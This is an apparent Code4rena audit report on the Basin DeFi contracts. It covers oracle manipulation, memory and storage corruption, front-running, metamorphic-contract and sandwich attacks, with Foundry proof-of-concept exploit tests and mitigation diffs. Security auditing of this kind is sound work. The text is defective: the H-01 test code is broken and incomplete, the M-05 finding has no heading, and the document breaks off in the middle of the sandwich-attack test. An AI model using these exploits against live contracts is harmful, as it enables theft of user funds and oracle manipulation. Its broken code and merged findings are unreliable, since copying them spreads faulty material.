# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Basin smart contract system written in Solidity. The audit took place between July 3â€”July 10 2023.

# High Risk Findings (1)
## [[H-01] Pumps are not updated in the shift() and sync() functions, allowing oracle manipulation](https://github.com/code-423n4/2023-07-basin-findings/issues/136)
*Submitted by [Eeyore](https://github.com/code-423n4/2023-07-basin-findings/issues/136), also found by [LokiThe5th](https://github.com/code-423n4/2023-07-basin-findings/issues/296), Trust ([1](https://github.com/code-423n4/2023-07-basin-findings/issues/254), [2](https://github.com/code-423n4/2023-07-basin-findings/issues/253)), [pontifex](https://github.com/code-423n4/2023-07-basin-findings/issues/278), [oakcobalt](https://github.com/code-423n4/2023-07-basin-findings/issues/57), and [Brenzee](https://github.com/code-423n4/2023-07-basin-findings/issues/177)*

<https://github.com/code-423n4/2023-07-basin/blob/9403cf973e95ef7219622dbbe2a08396af90b64c/src/Well.sol#L352-L377> <br><https://github.com/code-423n4/2023-07-basin/blob/9403cf973e95ef7219622dbbe2a08396af90b64c/src/Well.sol#L590-L598>

The `Well` contract mandates that the `Pumps` should be updated with the previous block's `reserves` in case `reserves` are changed in the current block to reflect the price change accurately.

However, this doesn't happen in the `shift()` and `sync()` functions, providing an opportunity for any user to manipulate the `reserves` in the current block before updating the `Pumps` with new manipulated `reserves` values.

### Impact

The `Pumps` (oracles) can be manipulated. This can affect any contract/protocol that utilizes `Pumps` as on-chain oracles.

### Proof of Concept

1.  A malicious user performs a `shift()` operation to update `reserve`s to desired amounts in the current block, thereby overriding the `reserves` from the previous block.
2.  The user performs `swapFrom()/swapTo()` operations to extract back the funds used in the `shift()` function. As a result, the attacker is not affected by any arbitration as pool `reserves` revert back to the original state.
3.  The `swapFrom()/swapTo()` operations trigger the `Pumps` update with invalid `reserves`, resulting in oracle manipulation.

Note: The `sync()` function can also manipulate `reserves` in the current block, but it's less useful than `shift()` from an attacker's perspective.

### PoC Tests

This test illustrates how to use `shift()` to manipulate `Pumps` data.

Create `test/pumps/Pump.Manipulation.t.sol` and run `forge test --match-test manipulatePump`.

contract PumpManipulationTest is TestHelper {
    MultiFlowPump pump;

    function setUp() public {
        pump = new MultiFlowPump(
            from18(0.5e18), // cap reserves if changed +/- 50% per block
            from18(0.5e18), // cap reserves if changed +/- 50% per block
            12, // block time
            from18(0.9e18) // ema alpha
        );

        Call[] memory _pumps = new Call[](1);
        _pumps[0].target = address(pump);
        _pumps[0].data = new bytes(0);

    function test_manipulatePump() public prank(user) {
        uint256 amountIn = 1 * 1e18;

        // 1. equal swaps, reserves should be unchanged
        uint256 amountOut = well.swapFrom(tokens[0], tokens[1], amountIn, 0, user, type(uint256).max);
        well.swapFrom(tokens[1], tokens[0], amountOut, 0, user, type(uint256).max);

        uint256[] memory lastReserves = pump.readLastReserves(address(well));

        assertApproxEqAbs(lastReserves[1], 1000 * 1e18, 1);

        // 2. equal shift + swap, reserves should be unchanged (but are different)

        assertApproxEqAbs(lastReserves[1], 1000 * 1e18, 1);
    }
}
```
### Tools Used

### Recommended Mitigation Steps

Update `Pumps` in the `shift()` and `sync()` function.

```diff
    function shift(
        IERC20 tokenOut,
        uint256 minAmountOut,
        address recipient
    ) external nonReentrant returns (uint256 amountOut) {
        IERC20[] memory _tokens = tokens();
-       uint256[] memory reserves = new uint256[](_tokens.length);
+       uint256[] memory reserves = _updatePumps(_tokens.length);
```

```diff
    function sync() external nonReentrant {
        IERC20[] memory _tokens = tokens();
-       uint256[] memory reserves = new uint256[](_tokens.length);
+       uint256[] memory reserves = _updatePumps(_tokens.length);
```

# Medium Risk Findings (13)
## [[M-01] Memory corruption in getBytes32FromBytes() can likely lead to loss of funds](https://github.com/code-423n4/2023-07-basin-findings/issues/263)
*Submitted by [Trust](https://github.com/code-423n4/2023-07-basin-findings/issues/263)*

The `LibBytes` library is used to read and store `uint128` types compactly for Well functions. The function `getBytes32FromBytes()`  will fetch a specific index as `bytes32`.

```solidity
/**
 * @dev Read the `i`th 32-byte chunk from `data`.
 */
function getBytes32FromBytes(bytes memory data, uint256 i) internal pure returns (bytes32 _bytes) {
    uint256 index = i * 32;
    if (index > data.length) {
        _bytes = ZERO_BYTES;
    } else {
        assembly {
            _bytes := mload(add(add(data, index), 32))
        }
    }
}
```

If the index is out of bounds in the data structure, it returns `ZERO_BYTES = bytes32(0)`. The issue is that the OOB check is incorrect. If `index=data.length`, the request is also OOB. For example:
`data.length=0` -> array is empty, `data[0]` is undefined.
`data.length=32` -> array has one `bytes32`, `data[32]` is undefined.

In other words, fetching the last element in the array will return whatever is stored in memory after the `bytes` structure.

### Impact

Users of `getBytes32FromBytes` will receive arbitrary incorrect data. If used to fetch reserves like `readUint128`, this could easily cause severe damage, like incorrect pricing, or wrong logic that leads to loss of user funds.

### PoC

The damage is easily demonstrated using the example below:

```solidity

pragma solidity 0.8.17;

contract Demo {
    event Here();
    bytes32 private constant ZERO_BYTES = bytes32(0);


    function corruption_POC(bytes memory data1, bytes memory data2) external returns (bytes32 _bytes) {
        _bytes = getBytes32FromBytes(data1, 1);
    }

    function getBytes32FromBytes(bytes memory data, uint256 i) internal returns (bytes32 _bytes) {
        uint256 index = i * 32;
        if (index > data.length) {
            _bytes = ZERO_BYTES;
        } else {
            emit Here();
            assembly {
                _bytes := mload(add(add(data, index), 32))
            }
        }
    }
}
```

Calling corruption_POC with the following parameters:

    {
    	"bytes data1": "0x2222222222222222222222222222222222222222222222222222222222222222",
    	"bytes data2": "0x3333333333333333333333333333333333333333333333333333333333333333"
    }

The output `bytes32` is:

    {
    	"0": "bytes32: _bytes 0x0000000000000000000000000000000000000000000000000000000000000020"
    }

The 0x20 value is in fact the size of the `data2` bytes that resides in memory from the call to `getBytes32FromBytes`.

### Recommended Mitigation Steps

Change the logic to:

```solidity
if (index >= data.length) {
    _bytes = ZERO_BYTES;
} else {
    assembly {
        _bytes := mload(add(add(data, index), 32))
    }
}
```

## [[M-02] Due to slot confusion, reserve amounts in the pump will be corrupted, resulting in wrong oracle values](https://github.com/code-423n4/2023-07-basin-findings/issues/260)
*Submitted by [Trust](https://github.com/code-423n4/2023-07-basin-findings/issues/260), also found by [kutugu](https://github.com/code-423n4/2023-07-basin-findings/issues/297)*

<https://github.com/code-423n4/2023-07-basin/blob/c1b72d4e372a6246e0efbd57b47fb4cbb5d77062/src/libraries/LibBytes16.sol#L45> <br><https://github.com/code-423n4/2023-07-basin/blob/c1b72d4e372a6246e0efbd57b47fb4cbb5d77062/src/libraries/LibLastReserveBytes.sol#L58>

### Description

The MultiFlowPump contract stores reserve counts on every update, using the libraries LibBytes16 and LibLastReserveBytes. Those libs pack `bytes16` values efficiently with the `storeBytes16()` and `storeLastReserves` functions.
In case of an odd number of items, the last storage slot will be half full. Care must be taken to not step over the previous value in that slot. This is done correctly in `LibBytes`:

```solidity
if (reserves.length & 1 == 1) {
    require(reserves[reserves.length - 1] <= type(uint128).max, "ByteStorage: too large");
    iByte = maxI * 64;
    assembly {
        sstore(
            // @audit - overwrite SLOT+MAXI*32
            add(slot, mul(maxI, 32)),
                                                       // @audit - read SLOT+MAXI*32 (2nd entry)
            add(mload(add(reserves, add(iByte, 32))), shl(128, shr(128, sload(add(slot, mul(maxI, 32))))))
        )
    }
}
```

As can be seen, it overwrites the slot with the previous 128 bits in the upper half of the slot, only setting the lower 128 bytes.

However, the wrong slot is read in the other two libraries. For example, in `storeLastReserves()`:

```solidity
if (reserves.length & 1 == 1) {
    iByte = maxI * 64;
    assembly {
        sstore(
            // @audit - overwrite SLOT+MAXI*32
            add(slot, mul(maxI, 32)),
                                                      // @audit - read SLOT+MAXI (2nd entry)??
            add(mload(add(reserves, add(iByte, 32))), shr(128, shl(128, sload(add(slot, maxI)))))
        )
    }
}
```

The error is not multiplying `maxI` before adding it to `slot`. This means that the reserves count encoded in lower 16 bytes in `add(slot, mul(maxI, 32))` will have the value of a reserve in a much lower index.
Slots are used in 32 byte increments, i.e. S, S+32, S+64...
When `maxI==0`, the intended slot and the actual slot overlap. When `maxI` is 1..31, the read slot happens to be zero (unused), so the first actual corruption occurs on `maxI==32`. By substitution, we get:
`SLOT[32*32] = correct reserve | SLOT[32]`
In other words, the 4rd reserve (stored in lower 128 bits of  `SLOT[32]`) will be written to the 64th reserve.

The Basin pump is intended to support an arbitrary number of reserves safely, therefore the described storage corruption impact is in scope.

### Impact

Reserve amounts in the pump will be corrupted, resulting in wrong oracle values.

### PoC

1.  A reserve update is triggered on the pump when some Well action occurs.
2.  Suppose reserves are array `[0,1,2,...,63,64]`
3.  Reserve count is odd, so affected code block is reached
4.  `SLOT[32*32] = UPPER: 64 | LOWER: SLOT[32] = 64 | 3`

### Recommended Mitigation Steps

Change the `sload()` operation in both affected functions to `sload(add(slot, mul(maxI, 32)`

## [[M-03] Due to bit-shifting errors, reserve amounts in the pump will be corrupted, resulting in wrong oracle values](https://github.com/code-423n4/2023-07-basin-findings/issues/259)
*Submitted by [Trust](https://github.com/code-423n4/2023-07-basin-findings/issues/259)*

It is advised to first read finding: `Due to slot confusion, reserve amounts in the pump will be corrupted, resulting in wrong oracle values`, which provides all the contextual information for this separate bug.

We've discussed how a wrong `sload()` source slot leads to corruption of the reserves. In `LibBytes16`, another confusion occurs.

Recall the correct storage overwriting done in `LibBytes`:

```solidity
assembly {
    sstore(
        // @audit - overwrite SLOT+MAXI*32
        add(slot, mul(maxI, 32)),
                                                   // @audit - read SLOT+MAXI*32 (2nd entry)
        add(mload(add(reserves, add(iByte, 32))), shl(128, shr(128, sload(add(slot, mul(maxI, 32))))))
    )
}
```

Importantly, it **clears** the lower 128 bytes of the source slot and replaces the upper 128 bytes of the dest slot using the upper 128 bytes of  the source slot:
`shl(128,shr(128,SOURCE))`

In `storeBytes16()`, the `shl()` operation has been discarded. This means the code will use the upper 128 bytes of SOURCE to overwrite the lower 128 bytes in DEST.

    if (reserves.length & 1 == 1) {
        iByte = maxI * 64;
        assembly {
            sstore(
            // @audit - overwrite SLOT+MAXI*32
                add(slot, mul(maxI, 32)),
                                                        // @audit - overwrite lower 16 bytes with upper 16 bytes?
                add(mload(add(reserves, add(iByte, 32))), shr(128, sload(add(slot, maxI))))
            )
        }
    }

In other words, regardless of the SLOT being read, instead of keeping the lower 128 bits as is, it stores whatever happens to be in the upper 128 bits. Note this is a **completely** different error from the slot confusion, which happens to be in the same line of code.

### Impact

Reserve amounts in the pump will be corrupted, resulting in wrong oracle values

### PoC

Assume slot confusion bug has been corrected for clarity.

1.  A reserve update is triggered on the pump when some Well action occurs.
2.  Suppose reserves are array `[0,1,2,...,63,64]`
3.  Suppose previous reserves are array `[P0,P1,...,P64]`
4.  Reserve count is odd, so affected code block is reached
5.  `SLOT[32*32] = UPPER: 64 | LOWER: UPPER(SLOT[32*32]) = 64 | P64`

### Recommended Mitigation Steps

Replace the affected line with the calculation below:
`shr(128, shl(128, SLOT))`
This will use the lower 128 bytes and clear the upper 128 bytes,as intended.

## [[M-04] Long term denial of service due to lack of fees in Well](https://github.com/code-423n4/2023-07-basin-findings/issues/255)
*Submitted by [Trust](https://github.com/code-423n4/2023-07-basin-findings/issues/255), also found by [ptsanev](https://github.com/code-423n4/2023-07-basin-findings/issues/79)*

The Well allows users to permissionless swap assets or add and remove liquidity. Users specify the intended slippage in `swapFrom`, in `minAmountOut`.

The ConstantProduct2 implementation ensures `Kend - Kstart >= 0`, where `K = Reserve1 * Reserve2`, and the delta should only be due to tiny precision errors.

Furthermore, the Well does not impose any fees to its users. This means that all conditions hold for a successful DOS of any swap transactions.

1.  Token cost of sandwiching swaps is zero (no fees) - only gas cost
2.  Price updates are instantenous through the billion dollar formula.
3.  Swap transactions along with the max slippage can be viewed in the mempool

Note that such DOS attacks have serious adverse effects both on the protocol and the users. Protocol will use users due to disfunctional interactions. On the other side, users may opt to increment the max slippage in order for the TX to go through, which can be directly abused by the same MEV bots that could be performing the DOS.

### Impact

All swaps can be reverted at very little cost.

### PoC

1.  Evil bot sees swap TX, slippage=S
2.  Bot submits a flashbot bundle, with the following TXs
    1.  Swap TX in the same direction as victim, to bump slippage above S
    2.  Victim TX, which will revert
    3.  Swap TX in the opposite direction and velocity to TX (1). Because of the constant product formula, all tokens will be restored to the attacker.

### Recommended Mitigation Steps

Fees solve the problem described by making it too costly for attackers to DOS swaps. If DOS does takes place, liquidity providers are profiting a high APY to offset the inconvenience caused, and attract greater liquidity.

<https://github.com/code-423n4/2023-07-basin/blob/main/src/functions/ConstantProduct2.sol#L65-L66> <br><https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L590-L598> <br><https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L695-L702> <br><https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L541> <br><https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L562> <br><https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L582>

### Description

Let `reserves` returned by `Well._getReserves()` as x, y and `Well.tokenSupply()` as k.
They must maintain the invariant `x * y * EXP_PRECISION = k ** 2`.
However, the reserves can increase without updating the token supply if a user transfers one token of the well and call `Well.sync()`.
We can sync the reserves and balances using `Well.sync`, but there is no way to sync `Well.tokenSupply() ** 2` to `x * y * EXP_PRECISION`.

### Impact

`ConstantProduct2.calcReserve` assumes `Well.tokenSupply` equals to `reserves[0] * reserves[1]`.
This exception breaks the assumption and reverts normal transactions.
For example, when `Well.totalSupply` is less than `reserves[0] * reserves[1]`, [Well.removeLiquidityImbalanced](https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L562) may revert.

1.  Comment out minting initial liquidity in `TestHelper.sol`. <https://github.com/code-423n4/2023-07-basin/blob/main/test/TestHelper.sol#L107>

```solidity
function setupWell(Call memory _wellFunction, Call[] memory _pumps, IERC20[] memory _tokens) internal {
    // ...
    // @audit comment out the line 107 to see apparently
    // Add initial liquidity from TestHelper
    // addLiquidityEqualAmount(address(this), initialLiquidity);
}
```

2.  Add the test in `Well.AddLiquidity.t.sol` as below. <https://github.com/code-423n4/2023-07-basin/blob/main/test/Well.AddLiquidity.t.sol#L9>

```solidity
contract WellAddLiquidityTest is LiquidityHelper {
    function setUp() public {
        setupWell(2);
    }
    
    // @audit add this test
    function test_tokenSupplyError() public {
        IERC20[] memory tokens = well.tokens();
        Balances memory userBalance;
        Balances memory wellBalance = getBalances(address(well), well);

        console.log(wellBalance.lpSupply); // 0

        mintTokens(user, 10000000e18);

        vm.startPrank(user);
        tokens[0].transfer(address(well), 100);
        tokens[1].transfer(address(well), 100);
        vm.stopPrank();

        userBalance = getBalances(user, well);
        console.log(userBalance.lp); // 0

        addLiquidityEqualAmount(user, 1);

        userBalance = getBalances(user, well);
        console.log(userBalance.lp); // 1e6

        well.sync(); // reserves = [101, 101]

        uint256[] memory amounts = new uint256[](tokens.length);
        amounts[0] = 1;

        // FAIL: Arithmetic over/underflow
        vm.prank(user);
        well.removeLiquidityImbalanced(type(uint256).max, amounts, user, type(uint256).max);
    }
}
```

3.  I commented the reason of underflow. <https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L562>

```solidity
function removeLiquidityImbalanced(
    uint256 maxLpAmountIn,
    uint256[] calldata tokenAmountsOut,
    address recipient,
    uint256 deadline
) external nonReentrant expire(deadline) returns (uint256 lpAmountIn) {
    IERC20[] memory _tokens = tokens();
    uint256[] memory reserves = _updatePumps(_tokens.length);

    for (uint256 i; i < _tokens.length; ++i) {
        _tokens[i].safeTransfer(recipient, tokenAmountsOut[i]);
        reserves[i] = reserves[i] - tokenAmountsOut[i];
    }

    // @audit
    // 1e6 - sqrt(101 * (101 - 1) * 1000000 ** 2)
    // <=> 1e6 - 100498756
    lpAmountIn = totalSupply() - _calcLpTokenSupply(wellFunction(), reserves);
    if (lpAmountIn > maxLpAmountIn) {
        revert SlippageIn(lpAmountIn, maxLpAmountIn);
    }
    _burn(msg.sender, lpAmountIn);

    _setReserves(_tokens, reserves);
    emit RemoveLiquidity(lpAmountIn, tokenAmountsOut, recipient);
}
```
### Recommended Mitigation Steps

In `Well.sync()`, mint `(reserves[0] * reserves[1] * ConstantProduct2.EXP_PRECISION).sqrt() - totalSupply()` Well tokens to `msg.sender`.

This keeps the invariant that `Well.tokenSupply() ** 2` equals to `reserves[0] * reserves[1] * ConstantProduct2.EXP_PRECISION` as long as the swap fee is 0.

## [[M-06] There is a large precision error in sqrt calculation of lp](https://github.com/code-423n4/2023-07-basin-findings/issues/190)
*Submitted by [kutugu](https://github.com/code-423n4/2023-07-basin-findings/issues/190)*

Compared with div, there is a larger precision error in calculating lp through sqrt, so there should be a way to check whether there are excess tokens left when adding liquidity.

### Proof of Concept

```solidity
    function testCalcLpTokenSupplyDiff() public {
        uint256[] memory reserves = new uint256[](2);
        reserves[0] = 1e24 + 1e4;
        reserves[1] = 10000;
        uint256 lp1 = this.calcLpTokenSupply(reserves, bytes(""));
        reserves[0] = 1e24;
        reserves[1] = 10000;
        uint256 lp2 = this.calcLpTokenSupply(reserves, bytes(""));
        assert(lp1 == lp2);
    }
```

When reserve\[0] is larger relative to reserve\[1], the accuracy error is larger, and unlike div, the accuracy error is only 1, the accuracy error of sqrt is larger.
When the user input the imbalance the amount will left excess reserve, searchers will monitor the contract after the excess reserve accumulation to a certain degree, will withdraw them by removeLiquidityImbalanced.

### Recommended Mitigation Steps

Excess reserve tokens should be returned when the user adds liquidity

## [[M-07] `boreWell` can be frontrun/DoS-d](https://github.com/code-423n4/2023-07-basin-findings/issues/181)
*Submitted by [tonisives](https://github.com/code-423n4/2023-07-basin-findings/issues/181), also found by [Inspecktor](https://github.com/code-423n4/2023-07-basin-findings/issues/221), [peanuts](https://github.com/code-423n4/2023-07-basin-findings/issues/217), [sces60107](https://github.com/code-423n4/2023-07-basin-findings/issues/187), [Qeew](https://github.com/code-423n4/2023-07-basin-findings/issues/159), and [MohammedRizwan](https://github.com/code-423n4/2023-07-basin-findings/issues/113)*

The `boreWell` function in the Aquifer contract is responsible for creating new Wells. However, there are two critical security issues:

1.  **Stealing of user's deposit amount**: The public readability of the `salt` parameter allows an attacker to frontrun a user's transaction and capture the deposit amount intended for the user's Well. By creating a Well with the same `salt` value, the attacker can receive the deposit intended for the user's Well and withdraw the funds.
2.  **DoS for `boreWell`**: Another attack vector involves an attacker deploying a Well with the same `salt` value as the user's intended Well. This causes the user's transaction to be reverted, resulting in a denial-of-service (DoS) attack on the `boreWell` function. The attacker can repeatedly execute this attack, preventing users from creating new Wells.

## Proof of Concept

### Stealing of user's deposit amount

If a user intends to create a new Well and deposit funds into it, an attacker can frontrun the user's transactions and capture the deposit amount. Here is how the attack scenario unfolds:

1.  The user broadcasts two transactions: the first to create a Well with a specific `salt` value, and the second to deposit funds into the newly created Well.
2.  The attacker views these pending transactions and frontruns them by creating a Well for themselves using the same `salt` value.
3.  The attacker's Well gets created with the same address that the user was expecting for their Well.
4.  As a result, the user's create Well transaction gets reverted, but the deposit transaction successfully executes, depositing the funds into the attacker's Well.
5.  Being the owner of the Well, the attacker can simply withdraw the deposited funds from the Well.

### DoS for `boreWell`

In this attack scenario, an attacker can forcefully revert a user's create Well transaction by deploying a Well for themselves using the user's `salt` value. Here are the steps of the attack:

1.  The user broadcasts a create Well transaction with a specific `salt` value.
2.  The attacker frontruns the user's transaction and creates a Well for themselves using the same `salt` value.
3.  As a result, the user's original create Well transaction gets reverted since the attacker's Well already exists at the predetermined address.
4.  This attack can be repeated multiple times, effectively causing a denial-of-service (DoS) attack on the boreWell function.

### Tools Used

VS Code

### Recommended Mitigation Steps

To mitigate the identified security issues, it is recommended to make the upcoming Well address user-specific by combining the `salt` value with the user's address. This ensures that each user's Well has a unique address and prevents frontrunning attacks and DoS attacks. The following code snippet demonstrates the recommended modification:

```
well = implementation.cloneDeterministic(
    keccak256(abi.encode(msg.sender, `salt`))
);

```

## [[M-08] Treating of BLOCK_TIME as permanent will cause serious economic flaws in the oracle when block times change](https://github.com/code-423n4/2023-07-basin-findings/issues/176)
*Submitted by [Trust](https://github.com/code-423n4/2023-07-basin-findings/issues/176)*

Pumps receive the chain BLOCK_TIME in the constructor. In every update, it is used to calculate the `blocksPassed` variable, which determines what is the maximum change in price (done in `_capReserve()`).

The issue is that BLOCK_TIME is an immutable variable in the pump, which is immutable in the Well, meaning it is basically set in stone and can only be changed through a Well redeploy and liquidity migration (very long cycle).
However, BLOCK_TIME actually changes every now and then, especially in L2s.For example, the recent Bedrock upgrade in Optimism completely [changed](https://community.optimism.io/docs/developers/bedrock/differences/#the-evm) the block time generation. It is very clear this will happen many times over the course of Basin's lifetime.

When a wrong BLOCK_TIME is used, the `_capReserve()` function will either limit price changes too strictly, or too permissively. In the too strict case, this would cause larger and large deviations between the oracle pricing and the real market prices, leading to large arb opportunities. In the too permissive case, the function will not cap changes like it is meant to, making the oracle more manipulatable than the economic model used when deploying the pump.

### Impact

Treating of BLOCK_TIME as permanent will cause serious economic flaws in the oracle when block times change.

### Recommended Mitigation Steps

The BLOCK_TIME should be changeable, given a long enough freeze period where LPs can withdraw their tokens if they are unsatisfied with the change.

## [[M-09] Aquifer is vulnerable to Metamorphic Contract Attack](https://github.com/code-423n4/2023-07-basin-findings/issues/168)
*Submitted by [a3yip6](https://github.com/code-423n4/2023-07-basin-findings/issues/168)*

The [Aquifer](https://github.com/code-423n4/2023-07-basin/blob/9403cf973e95ef7219622dbbe2a08396af90b64c/src/Aquifer.sol#L40-L64) contract supports multiple ways to deploy the `Well` contracts. More specifically, it supports `create` and `create2` at the same time. However, such a feature is vulnerable to the [Metamorphic Contract Attack](https://github.com/0age/metamorphic/tree/master). That is to say, attackers are capable to deploy two different `Well` implementations in the same address, which is recorded by `mapping(address => address) wellImplementations;`.

Although the Aquifer contract is claimed to be permissionless, it should not break the immutability. Thus, we consider it a medium-risk bug.

### Impact

The real implementation of the `Well` contract listed in `Aquifer` may be inconsistent with the expectation of users. Even worse, users may suffer from unexpected loss due to the change of contract logic.

### Proof of Concept

    // the Aquifer contract
    function boreWell(
        address implementation,
        bytes calldata immutableData,
        bytes calldata initFunctionCall,
        bytes32 salt
    ) external nonReentrant returns (address well) {
        if (immutableData.length > 0) {
            if (salt != bytes32(0)) {
                well = implementation.cloneDeterministic(immutableData, salt);
            } else {
                well = implementation.clone(immutableData);
            }
        } else {
            if (salt != bytes32(0)) {
                well = implementation.cloneDeterministic(salt);
            } else {
                well = implementation.clone();
            }
        }
        ...
    }

    // the cloneDeterministic() function
    function cloneDeterministic(address implementation, bytes32 salt)
            internal
            returns (address instance)
        {
            /// @solidity memory-safe-assembly
            assembly {
                mstore(0x21, 0x5af43d3d93803e602a57fd5bf3)
                mstore(0x14, implementation)
                mstore(0x00, 0x602c3d8160093d39f33d3d3d3d363d3d37363d73)
                instance := create2(0, 0x0c, 0x35, salt)
                // Restore the part of the free memory pointer that has been overwritten.
                mstore(0x21, 0)
                // If `instance` is zero, revert.
                if iszero(instance) {
                    // Store the function selector of `DeploymentFailed()`.
                    mstore(0x00, 0x30116425)
                    // Revert with (offset, size).
                    revert(0x1c, 0x04)
                }
            }
        }

As shown in the above code, attackers are capable to deploy new `Well` contracts through `cloneDeterministic` multiple times with the same input parameter `implementation`. And the `cloneDeterministic` function utilizes the following bytecode to deploy a new `Well` contract: `0x602c3d8160093d39f33d3d3d3d363d3d37363d73 + implementation + 5af43d3d93803e602a57fd5bf3`. That is to say, if the address (i.e., `implementation`) remains the same, then the address of the deployed `Well` contract also remains the same.

Normally, EVM would revert if anyone re-deploy a contract to the same address. However, if the `implementation` contract contains self-destruct logic, then attackers can re-deploy a new contract with different bytecode to the same address through `cloneDeterministic`.

Here is how we attack:

*   Assuming Bob deploys `Well_Implementation1` to address 1.
*   Bob invoke `Aquifer:boreWell` with address 1 as the parameter to get a newly deployed `Well1` contract at address 2.
*   Bob invokes the self-destruct logic in the `Well_Implementation1` contract and re-deploy a new contract to address 1 through [Metamorphic Contract](https://github.com/0age/metamorphic/tree/master), namely `Well_Implementation2`.
*   Bob invoke `Aquifer:boreWell` with address 1 again. Since the input of `create2` remains the same, a new contract is deployed to address 2 with new logic from `Well_Implementation2`.

### Recommended Mitigation Steps

Remove the `cloneDeterministic` feature, leaving the `clone` functionality only.

## [[M-10] Transferout exclusive `feeOnTransfer` tokens will run out of well](https://github.com/code-423n4/2023-07-basin-findings/issues/108)
*Submitted by [kutugu](https://github.com/code-423n4/2023-07-basin-findings/issues/108)*

<https://github.com/code-423n4/2023-07-basin/blob/9403cf973e95ef7219622dbbe2a08396af90b64c/src/Well.sol#L610> <br><https://github.com/code-423n4/2023-07-basin/blob/9403cf973e95ef7219622dbbe2a08396af90b64c/src/Well.sol#L304> <br><https://github.com/code-423n4/2023-07-basin/blob/9403cf973e95ef7219622dbbe2a08396af90b64c/src/Well.sol#L370>

### Impact

The well does not check the actual transferout amount and the k value, which for exclusive `feeOnTransfer` tokens causes the well to have a portion of the token fee cut out of air every time the token is transferred, which is not included in the transfer amount. Attackers can take advantage of this to run out of well.

### Proof of Concept

The most common attack flow is through the skim function:

1.  Attacker swaps to increase the price of exclusive `feeOnTransfer` token
2.  Attacker transfers token to well and skim. This will cut some of the well funds
3.  Repeat the above process to reduce the number of well tokens to 1
4.  Attacker calls sync and swap to pair token

### Recommended Mitigation Steps

Check the correct amount every time you transfer out.

 > I think this is correct. Most fee-on-transfer tokens will take the fee on the recipient, but there isn't a rule or even a standard that forbids the fee-on-transfer token to take the fees from the sender, or from both. My bank has all of these options for transfers that include fees.
> 
> The Well in scope is intended to support fee-on-transfer tokens, but nowhere it is specified that it is intended to support only recipient-fee-on-transfer tokens, and therefore is vulnerable. This could be a critical except that recipient-fee-on-transfer tokens are exceedingly rare at the time, and only Wells deployed for those exceedingly rare tokens would be drained.

 >@publiuss, I can reduce the severity to QA on account of the low quality and invalid Proof of Concept, but I think that the attack vector is valid.

 >Correct me if I'm wrong, but swapFromFeeOnTransfer only considers fees in the incoming token. For the outgoing token it assumes that fees will be deducted from the amount received, and calls _swapFrom as for non-fee tokens.

 >Normally I wouldn't worry too much about fee-on-transfer tokens, but you explicitly intend to support them, and there is no standard defining how fees should be collected, so they could be deducted from the sender's balance after each successful transfer.

 >During a swapFromFeeOnTransfer, inside the _swapFrom call, we will calculate what the reserves should be, and from there the amountOut. Then the Well transfers out the amountOut and sets the reserves to the calculated amounts.

 >Only that if a fee is collected from the sender after the transfer, the stored reserves will be higher than the actual well balances, and this discrepancy will grow with each swap.

 >Would you please check again if my reasoning is right?

 >I don't know if I would fix this in the code, I would most likely just state in the docs that only fee-on-transfer tokens where the fee is collected from the receiver are supported, and those where the fee is collected from the sender are not, but that is up to you.

## [[M-11] `addLiquidity` Sandwich Attack for unbalanced token deposits](https://github.com/code-423n4/2023-07-basin-findings/issues/82)
*Submitted by [Cosine](https://github.com/code-423n4/2023-07-basin-findings/issues/82)*

<https://github.com/code-423n4/2023-07-basin/blob/c1b72d4e372a6246e0efbd57b47fb4cbb5d77062/src/Well.sol#L392-L399>

<https://github.com/code-423n4/2023-07-basin/blob/c1b72d4e372a6246e0efbd57b47fb4cbb5d77062/src/Well.sol#L495-L517>

### Impact

Wells supports adding and removing liquidity in imbalanced proportions. If a user wants to deposit liquidity in an imbalanced ratio (only one token). A attacker can front run the user by doing the same and removing the liquidity directly after the deposit of the user. By doing so the attacker steals a significant percentage of the users funds. This bug points to a mathematical issue whose effects could be even greater.

### Proof of Concept

The following code demonstrates the described vulnerability:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {TestHelper, Balances} from "test/TestHelper.sol";

contract Exploits is TestHelper {
    function setUp() public {
        setupWell(2); // Setup Well with two tokens and a balanced token ratio
    }

    function test_add_liquidity_sandwich_attack() public {
        // init attacker and liquidityProvider, gives them some tokens and saves there balances before the attack
        address liquidityProvider = vm.addr(1);
        address attacker = vm.addr(2);
        mintTokens(liquidityProvider, uint256(100 * 1e18));
        mintTokens(attacker, uint256(1000 * 1e18));
        Balances memory liquidityProviderBalanceBefore = getBalances(address(liquidityProvider), well);
        Balances memory attackerBalanceBefore = getBalances(address(attacker), well);

        // liquidityProvider wants to provide liquidity for only one token / not in current token ratio

        // attacker front runs liquidityProvider and add liquidity for token[0] before liquidityProvider
        vm.startPrank(attacker);
        tokens[0].approve(address(well), 1000 * 1e18);
        uint256[] memory amounts1 = new uint256[](2);
        amounts1[0] = 1000 * 1e18; // 10x the tokens of the liquidityProvider to steal more funds
        amounts1[1] = 0;
        well.addLiquidity(amounts1, 0, attacker, type(uint256).max); 
        vm.stopPrank();

        // liquidityProvider deposits some token[0] tokens
        vm.startPrank(liquidityProvider);
        tokens[0].approve(address(well), 100 * 1e18);
        uint256[] memory amounts2 = new uint256[](2);
        amounts2[0] = 100 * 1e18;
        amounts2[1] = 0;
        well.addLiquidity(amounts2, 0, liquidityProvider, type(uint256).max); 
        vm.stopPrank();

        // attacker burns the LP tokens directly after the deposit of the liquidity provider
        vm.startPrank(attacker);
        Balances memory attackerBalanceBetween = getBalances(address(attacker), well);
        well.removeLiquidityOneToken(
            attackerBalanceBetween.lp,
            tokens[0],
            1,
            address(attacker),
            type(uint256).max
        );
        vm.stopPrank();
        Balances memory attackerBalanceAfter = getBalances(address(attacker), well);
        
        // the attacker got nearly 30% of the liquidityProviders token by front running
        // the percentage value can be increased even further by increasing the amount of tokens the attacker deposits
        // and/or decreasing the amount of tokens the liquidityProvider deposits
